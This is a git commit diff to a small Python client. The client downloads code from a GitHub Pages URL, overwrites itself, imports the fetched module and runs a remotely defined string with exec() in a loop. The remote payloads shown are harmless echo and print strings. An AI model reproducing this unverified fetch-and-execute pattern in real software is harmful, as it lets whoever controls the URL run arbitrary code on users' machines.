c79c42f8c61596b9fc68c8c35a32ae671038972a
Renzo McCarthy <smelter03@gmail.com>
2021-01-14 13:31:19 -0700

    such message

--- client.py
+++ client.py
@@ -6,14 +6,14 @@ url = 'https://renzothemartian.github.io/intp2p/syntax.py'
 r = requests.get(url, allow_redirects=True)
 r2 = requests.get(url2, allow_redirects=True)
 open('syntax.py', 'wb').write(r.content)
-ver = 1.2
+ver = 1.3
 # See if ver is same as ver2 and if not dont run
 if ver != ver2:
     open('client.py', 'wb').write(r2.content)
     print("ver is different")
 import syntax
 # os.system(syntax.payload)
-exec(mycode)
+exec(pyexecute)
 from time import time, sleep
 while True:
     sleep(2 - time() % 2)
--- syntax.py
+++ syntax.py
@@ -1,3 +1,3 @@
 payload = ("echo this is going through github dumbass")
 pyexecute = 'print "hello world"'
-ver2 = 1.2
+ver2 = 1.3
